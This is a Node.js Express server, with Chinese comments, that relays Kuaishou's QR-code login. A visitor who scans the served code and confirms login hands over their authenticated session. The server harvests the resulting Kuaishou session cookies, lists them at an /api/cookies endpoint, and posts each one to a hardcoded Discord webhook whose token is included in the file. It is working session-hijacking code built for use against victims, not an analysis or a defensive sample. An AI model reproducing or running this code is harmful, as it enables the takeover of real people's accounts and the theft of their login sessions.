const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const scans = {};
const cookies = [];
const logs = [];

function ksRequest(method, hostname, path, body, cookieStr) {
    return new Promise(function(resolve, reject) {
        var headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Referer": "https://www.kuaishou.com/"
        };
        if (body) {
            headers["Content-Type"] = "application/json";
        }
        if (cookieStr) {
            headers["Cookie"] = cookieStr;
        }

        var options = {
            hostname: hostname,
            path: path,
            method: method,
            headers: headers
        };

        var req = https.request(options, function(res) {
            var bodyStr = "";
            var respCookies = res.headers["set-cookie"] || [];
            var location = res.headers["location"] || "";
            res.on("data", function(chunk) { bodyStr += chunk; });
            res.on("end", function() {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    cookies: respCookies,
                    body: bodyStr,
                    location: location
                });
            });
        });

        req.on("error", function(e) {
            logs.push("请求错误: " + path + " " + e.message);
            reject(e);
        });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

function getCookieValue(cookies, name) {
    for (var i = 0; i < cookies.length; i++) {
        if (cookies[i].indexOf(name + "=") !== -1) {
            return cookies[i].split(name + "=")[1].split(";")[0];
        }
    }
    return "";
}

function buildCookie(cookieArr) {
    return cookieArr.map(function(c) { return c.split(";")[0]; }).join("; ");
}

// 初始化session：先访问快手和id页面获取基础cookie
function initSession() {
    return ksRequest("GET", "www.kuaishou.com", "/", null, null).then(function(result1) {
        var baseCookies = result1.cookies.slice();
        
        // 再访问id.kuaishou.com获取id相关cookie
        return ksRequest("GET", "id.kuaishou.com", "/", null, buildCookie(baseCookies)).then(function(result2) {
            baseCookies = baseCookies.concat(result2.cookies);
            
            return ksRequest("GET", "id.kuaishou.com", "/passport/qrCode", null, buildCookie(baseCookies)).then(function(result3) {
                baseCookies = baseCookies.concat(result3.cookies);
                
                logs.push("初始化完成，cookie数: " + baseCookies.length);
                logs.push("cookie keys: " + baseCookies.map(function(c) { 
                    return c.split("=")[0]; 
                }).join(", "));
                
                return { cookies: baseCookies, cookieStr: buildCookie(baseCookies) };
            });
        });
    });
}

// ====== 页面 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 生成二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();

    initSession().then(function(session) {
        ksRequest(
            "POST",
            "id.kuaishou.com",
            "/rest/c/infra/ks/qr/start",
            { source: "web" },
            session.cookieStr
        ).then(function(result) {
            logs.push("qr/start响应: " + result.body.substring(0, 500));

            try {
                var data = JSON.parse(result.body);

                if (data.result !== 1) {
                    return res.json({ error: "快手返回错误: " + (data.error_msg || "未知") });
                }

                var qrCode = (data.data && (data.data.qrCode || data.data.imageData)) || "";
                var qrToken = (data.data && (data.data.qrToken || data.data.token)) || "";

                if (!qrCode) {
                    return res.json({ error: "未找到二维码", raw: data });
                }

                var allCookies = session.cookies.concat(result.cookies);

                scans[scanId] = {
                    status: "wait",
                    cookie: null,
                    qrToken: qrToken,
                    qrCode: qrCode,
                    cookies: allCookies,
                    cookieStr: buildCookie(allCookies),
                    createdAt: Date.now()
                };

                logs.push("二维码成功，qrToken: " + (qrToken ? "有" : "无"));
                res.json({ scanId: scanId, qrCode: qrCode });
            } catch(e) {
                logs.push("解析错误: " + e.message);
                res.json({ error: "解析失败" });
            }
        }).catch(function(e) {
            logs.push("请求失败: " + e.message);
            res.status(500).json({ error: "请求失败" });
        });
    }).catch(function(e) {
        logs.push("初始化失败: " + e.message);
        res.status(500).json({ error: "初始化session失败" });
    });
});

// ====== 检查状态 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    if (scan.status === "done") {
        return res.json({ status: "done", cookie: scan.cookie });
    }

    ksRequest(
        "POST",
        "id.kuaishou.com",
        "/rest/c/infra/ks/qr/checkResult",
        { qrToken: scan.qrToken },
        scan.cookieStr
    ).then(function(result) {
        logs.push("checkResult: " + result.body.substring(0, 300));

        try {
            var data = JSON.parse(result.body);
            var scanStatus = (data.data && data.data.status) || data.status || 0;

            if (scanStatus === 2 || scanStatus === 3) {
                // 扫码确认成功，合并所有cookie
                var allCookies = scan.cookies.concat(result.cookies);

                // 访问快手首页获取最终cookie
                ksRequest("GET", "www.kuaishou.com", "/", null, buildCookie(allCookies)).then(function(homeRes) {
                    allCookies = allCookies.concat(homeRes.cookies);

                    scan.cookie = buildCookie(allCookies);
                    scan.status = "done";

                    cookies.push({
                        cookie: scan.cookie,
                        time: new Date().toISOString()
                    });

                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                }).catch(function() {
                    scan.cookie = buildCookie(allCookies);
                    scan.status = "done";
                    cookies.push({ cookie: scan.cookie, time: new Date().toISOString() });
                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                });
            } else if (scanStatus === 1) {
                res.json({ status: "scanned" });
            } else {
                res.json({ status: "wait" });
            }
        } catch(e) {
            res.json({ status: "wait" });
        }
    }).catch(function() {
        res.json({ status: "wait" });
    });
});

// ====== Cookie列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== 日志 ======
app.get("/api/logs", function(req, res) {
    res.json(logs.slice(-30));
});

// ====== 发送Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({
        content: "**新Cookie**\n```\n" + cookie + "\n```"
    });

    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
        }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
    console.log("端口 " + PORT);
});